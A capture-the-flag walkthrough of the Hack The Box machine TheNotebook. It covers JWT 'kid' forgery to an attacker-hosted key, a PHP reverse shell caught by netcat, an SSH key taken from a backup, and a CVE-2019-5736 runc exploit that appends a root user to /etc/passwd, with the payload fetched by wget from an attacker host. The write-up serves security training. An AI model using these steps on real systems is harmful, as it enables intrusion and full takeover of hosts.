---
Description: >-
  Zain Khatib (KingCobra) writeup on the Medium-difficulty Linux machine TheNotebook from 
  https://hackthebox.eu
---

# HTB - TheNotebook

## Overview

![](./thenotebook-image.jpg)

Medium Linux machine that requires Web server JWT session based manipulation to get foothold and some enumeration to get user then a CVE for docker to get the root shell.

## Virtual Host 

add the notebook IP to the /etc/hosts file:

```text 
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.10.230 notebook
```
## Enumeration

### Nmap Scan

```text
# Nmap 7.91 scan initiated Wed Aug  4 15:56:36 2021 as: nmap -sS -sC -sV -oN nmap/scan notebook
Nmap scan report for notebook (10.10.10.230)
Host is up (0.54s latency).
Not shown: 996 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
8000/tcp  open     http    SimpleHTTPServer 0.6 (Python 3.6.9)
|_http-server-header: SimpleHTTP/0.6 Python/3.6.9
|_http-title: Directory listing for /
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug  4 15:56:57 2021 -- 1 IP address (1 host up) scanned in 21.02 seconds
```

## JWT misconfiguration in The Website

going to the website on port 80 we find the following page:

![] (/images/website.png)

we register as `username : kingcobra`  `password: kingcobra` and `email : kingcobra@notebook.htb`

![] (/images/website-login.png)

after loging we  are assigned the `auth JWT cookie` as:
``` text
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Imtpbmdjb2JyYSIsImVtYWlsIjoia2luZ2NvYnJhQG5vdGVib29rLmh0YiIsImFkbWluX2NhcCI6MH0.m4IlEuMvB2hbd-3HrbE1gmAlX4rJiDkbxylQNjcoyxUqqfEyIoxKhFPhiI3H8hvwVWzZj9VlP7Zxa3i20o2637gVtMHEdAn_Eve_4nzMBo5InfE9IRl59JbLrQkmkHbsz7Ap-odzW8X8XyN1N4SgCIDE8NTe69J4Vzbk0MQyZaMfLClHWX7D9W1Y38SfKYB8m2BCyEPUmdxhMyuz4LRUBN_o9neI6w_fDU5tO6M1UDKo94SxfIpzm-pkGI6a5gFg4IZ3ZPpk_P7P5qxZTXE3fJZnf33NydlJX-IQqSS39iECjqGCCXVhNd33WrODb4RghmouUw0Q42P8m9aM3p-VM4EldPsWbVUGGbIym908Lx9ZXGTQ7g50Ob3AmyotQ_9VJYMUIUHXBultmLeFVASR9HoSwzasZUnsFUrHTkfxE_4Z6aXyCfu-YMnEz3M4vMgbFKzPtRcCXYGt3W7LSrfsyI2DJEPgWzFyVuqHrUvD60fifzVwG6MFkw1Tjc7ELW88UoDGK3V8ry8lBFgk81RVE6zcNcx0OmrZFyEB4VLfhv7O0UjlezGZ_aRpJxkeSRduzx1LtOCa-sU7Ta-k874hOUFG-0GF5AYA_M_qbrPWfXk2TLYHjXKH9oXh1vkRCCbq4QRRair9rv-q7UAeIWg5Tzs76zKdg8rD4m9Rery3GDA
```

we then decode it from base64 to have:
```text
{"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}{"username":"kingcobra","email":"kingcobra@notebook.htb","admin_cap":0}&à.D¸ËÁÚ.ÝÜzÛ.X&.Uø¬...¼r..cr.±Rª.."(Ä¨E>..Ü.!¿.VÍ.ýVSûg.·.m(Û.û.[L.G@.KÞâ|Ì..H.ñ=!.yô.Ë.	&.vìÏ°)¡ÜÖñ..ÈÝMá(. 1<57ºô..Í¹41..hÇË
QÖ_°ý[V7ñ'Ê`.&Ø.².õ&w.LÊìø-..6.gx.°|59´î.Õ@Ê£Þ.Åò)Îjd...æ.`à.wdúd?³ù«.S\Mß%.ßßsrvRW!
.K.b.(ê. .V.]ßu«86øF.f¢å0Ñ.6?É½hÍéTÎ..ÓìYµT.fÈÊotð¼}eq.C¸9Ðæ÷.l¨µ.U%..!A×.ém.·.T..ôz.Ã6¬eIì.JÇNGñ..zi|.~æ..L÷3.Ì.±JÌûQp%Ø.ÝÖì´«~Ì.Ø2D>.³.%n¨zÔ¼>´~'óW.º0Y0Õ8ÜìBÖóÅ(.b·WÊòòPE.O5EQ:ÍÃ\ÇC¦..r...-øoìí..W³...¤.dy$]»<u.Ó.jÅ;M©<ï.NPQ´.^@`.*n³Ö}y6L¶..r.ö.áÖù..&êá.Qj*ý®ú»P..Z.SÎÎúÌ§`ò°ø.Ô^¯-Æ.
```
we notice two things:

#### first 

the algorithm for the JWT is RS256

#### second 

the url in the`kid` object in the JWT Header.

### third 

we need to flip the admin cap to 1

#### Now we are going to generate our own keys and let the `kid` point to our key

### Generate RSA Keys

using the script below :
```text 
ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key
# Don't add passphrase
openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub
cat jwtRS256.key
cat jwtRS256.key.pub
```
#### Private Key 

``` text
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```
#### public Key 

```text
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAqBhxjydIa5DXlSHA1px0
aR5xT9War3MTwfDtJVN+y6iVCQUpx6y3F7c8oNm2yy0jQM8yh4yPEj6TnoP2Ru8F
9UM4fVxVdIoMVF2dn7oSmWoI/xMs8mkXa73oWFvWrQTmvdN4d7zTGmzVaSsi07VS
jjC14upeA0w8RkjOzGSS9xQZIX5Nf/FVtMd/u/Mi25Zc34mOrzKoahSnjuZAb/Y4
8Tyf+i24VVscl/ZZCbhgNiewcxEzNE2qiwRL5HywqpoucNEZAXe3+kZK6XTxwSkJ
11AMtJkUwpmhq5inV5yduyj14v/jfeD5Raxe+FEl7p9bu36muzlcLd1c0oc1Y/3p
LGTAooZL/utIWWEV4jwbQaxsk4N/fyW4qMedeQa2WgJxNFUnLvOjcdDU78jQtMup
2jzdibTAA0rd3hej/k7R7QmO5U5tiHZQVEz80hv07duMen5/O5wtdXA+oO1xZQZ2
ffHLvQYsUShiDK0ypUS25cFPAZgJWh0LlJBAU1847zJTri5snYDU3YKt2Iybm61R
wgoQWg5hKXfSQnK4B0lYnYymN35trgaVbqxBKOdDMXik38i8bOdX1pkeyZQvmbAq
WVvXESgWkBc6UnuQXYp6XKQ1NyRkCQgPmBoWAiUqHohvWqwUoOds6DZ2sEarwnzd
E+SP0nQZ7+WPmKH6uk6ALrkCAwEAAQ==
-----END PUBLIC KEY-----
```

### New JWT Cookie

after generating our own RS256 keys now we must craft our own auth cookie by siging the JWT header and payload using our private and public keys as follows

#### header 

```text
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "http://< attacker Ip address >:8000/jwtRS256.key"
}
```

#### payload

```text
{
  "username": "kingcobra",
  "email": "kingcobra@notebook.htb",
  "admin_cap": 1
}
```
and then veify the JWT using our RS256 keys from the site https://jwt.io/

#### crafted Cookie

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC40Njo4MDAwL2p3dFJTMjU2LmtleSJ9.eyJ1c2VybmFtZSI6Imtpbmdjb2JyYSIsImVtYWlsIjoia2luZ2NvYnJhQG5vdGVib29rLmh0YiIsImFkbWluX2NhcCI6dHJ1ZX0.JpHz2FZ-u3C76bS1KFV9kX0TPgNtE1rcFT4n3dPYDW_EmhZwW5UHHZLD5KtjBSlgJDjxwO9_h7k1uVHIXsIcAYteowklHqdgtWdKVoW7qKU2Lcq9mjtfDjhTMRCJR01XYlbR7vZpqHV5mXV7EpkuJJ2j1BLl4wyr7bHqfrOWD_E1oINYG5gTdbN8JTqEl0caPt69qu-3NGWfD9xMzCL1WWW8ZtO-QHMHXd_FwBVVMTZiEawK6VKhCw6ymnxul7jo7oY_yGLJ3ZzHnF6LqauFWb57QMpUFwSgVENqiN46YhUeuJirchl1f8UP_2wsDMutWi0u-RaOYc9LBfypnvdiko8GPdCn97xK_H93PqIEGFKUk9ppRHt8pH1MIdB0P4_Je3GZ2ECR7DEnN9Wuxz1udl48bCs1T8PdjI6PNM3bBUXIhSKF0beQ6wM6pt0tTDpc_WdAQh2nfj7TCJtKwlduK9S_HO7mfY_aIijzW6OSs1LdptvdIsabu9sJPvXFZIgJCpM76zKCwqMGJQItullryrWO9pVQXcxqE7XHZza4OJhdmY692JUVg-FnDv6eHbgZCbReGC0ouukl08L5seROYa3MHZR3KSreJs5-jK8MblhvKbqKynVaWUtcLP9KTkPiRKyaJyt_9qNlHmN16kKd5oTQf2j4whkvcN2Clo7itFo
```
opening webserver to the our RS256 private key using python3 web server `python3 -m http.server`

## Admin Page 

after replaceing the cookie with our crafted cookie we request the our home page to notice that the website has made a requset to our python3 server to get the private key 

! [] (../images/key-request.png)

we notice that we have now a new admin panel tab in the navbar

![] (../images/admin-panel.png)

## FootHold

after going to the admin panel page we see that we can upload files to the server 

we're going to try to upload a php rev shell to the site.

! [] (./images/file-upload.png)

starting a nc listner `nc -lvnp 1234` and pressing the view button => we have a revshell 

! [] (./images/foothold.png)

## Stablize Shell

```text
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm-256color
^z
stty raw -echo;fg
```
## User SHELL

looking at the notes we find an interesting note:

! [] (./images/backups.png)

going to the `/var/backups` directory we find:

```text
www-data@thenotebook:/var/backups$ ls
alternatives.tar.0        apt.extended_states.3.gz  group.bak    shadow.bak
apt.extended_states.0     dpkg.diversions.0         gshadow.bak
apt.extended_states.1.gz  dpkg.statoverride.0       home.tar.gz
apt.extended_states.2.gz  dpkg.status.0             passwd.bak
```

notice the home.tar.gz file in the backups.
we'll get this file by opening a pythnon web server on the Target Machine and making a request to the file

then executing the command `tar -zxf home.tar.gz`

we find an .ssh directory with id_rsa key with no password.

we can now ssh to noah@notebook and get the user shell

```text
┌──(kingcobra㉿kali)-[~/…/TheNotebook/home/noah/.ssh]
└─$ chmod 600 id_rsa
                                                                                                                                                                                              
┌──(kingcobra㉿kali)-[~/…/TheNotebook/home/noah/.ssh]
└─$ ssh -i id_rsa noah@notebook
```

```text
noah@thenotebook:~$ id
uid=1000(noah) gid=1000(noah) groups=1000(noah)
```

## Root SHELL

### docker CVE-2019-5736

by writing the command `sudo -l` on user noah we find:

```text
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

you can read about the exploit in the following blog: 
https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/

download the POC from : https://github.com/Frichetten/CVE-2019-5736-PoC

#### generating /etc/passwd privilaged user entry:

generate password for our privilaged user

```text 
┌──(kingcobra㉿kali)-[~/hackthebox/TheNotebook]
└─$ openssl passwd -1 -salt mysalt pass123
$1$mysalt$lEeAKJmXWixtWh5SL7YFk0
```
now we have this /etc/passwd entry:
`rooot:$1$mysalt$lEeAKJmXWixtWh5SL7YFk0:0:0:/root:/root:/bin/bash`

now we can modify the main.go payload line to be :

```code
....
// This is the line of shell commands that will execute on the host
var payload = "#!/bin/bash \n echo 'rooot:$1$mysalt$lEeAKJmXWixtWh5SL7YFk0:0:0:/root:/root:/bin/bash' >> /etc/passwd"
....
```
now we build the main.go using the command `go build main.go`

and on the attacker machine we're going to enter the docker container and get the payload using the command
```
noah@thenotebook:~$ sudo  /usr/bin/docker exec -it webapp-dev01 /bin/bash
root@58fc4c26f1d6:/opt/webapp# wget http://<attacker ip address>:8000/main
root@58fc4c26f1d6:/opt/webapp# chmod +x main
root@58fc4c26f1d6:/opt/webapp# ./main
```

now we ssh to noah on a new tab and execute the sudo -l command 
```
noah@thenotebook:~$ sudo  /usr/bin/docker exec -it webapp-dev01 /bin/sh
No help topic for '/bin/sh'
```
and now the user rooot is created with root SHELL.
```
noah@thenotebook:~$ su rooot
Password: 
root@thenotebook:/home/noah# id
uid=0(root) gid=0(root) groups=0(root)
root@thenotebook:/home/noah# 
```
